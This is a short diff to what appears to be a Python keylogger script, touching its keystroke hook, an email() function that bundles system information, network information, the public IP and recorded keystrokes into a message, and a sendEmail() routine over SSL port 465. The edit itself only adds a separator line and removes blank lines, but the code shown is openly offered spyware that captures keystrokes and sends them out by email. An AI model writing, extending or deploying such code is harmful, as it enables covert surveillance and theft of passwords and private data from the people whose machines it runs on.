@@ -75,7 +75,7 @@ def on_press(key):
 # Send logging content to Email
 def email(keys):
     message = ""
-    message += f"{sysInfo}{netInfo}{pubIP}"
+    message += f"{sysInfo}{netInfo}{pubIP}======================================== Recorded Keystrokes ========================================\n"
     for key in keys:
         # Replace miscellenous characters to make it more readable
         x = key.replace("'", "")
@@ -90,8 +90,6 @@ def email(keys):
     sendEmail(message)
 
 # Email information
-
-
 def sendEmail(message):
     # For SSL
     port = 465
